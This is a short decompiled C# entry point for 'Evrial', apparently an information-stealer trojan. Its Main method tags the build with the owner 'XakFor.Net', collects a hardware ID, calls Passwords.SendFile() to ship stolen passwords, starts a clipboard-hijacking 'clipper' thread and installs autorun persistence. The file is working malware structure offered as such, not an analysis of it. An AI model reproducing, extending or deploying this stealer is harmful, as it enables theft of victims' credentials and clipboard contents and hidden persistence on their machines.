using System;
using System.Windows.Forms;
using Evrial.Hardware;
using Evrial.Stealer;

namespace Evrial
{
	// Token: 0x02000009 RID: 9
	internal static class Program
	{
		// Token: 0x06000016 RID: 22 RVA: 0x0000255C File Offset: 0x0000075C
		private static void Main()
		{
			RawSettings.Owner = "XakFor.Net";
			RawSettings.Version = "1.0.3";
			RawSettings.HWID = Identification.GetId();
			Passwords.SendFile();
			Module.ClipperThread();
			Run.Autorun();
			Application.Exit();
		}
	}
}
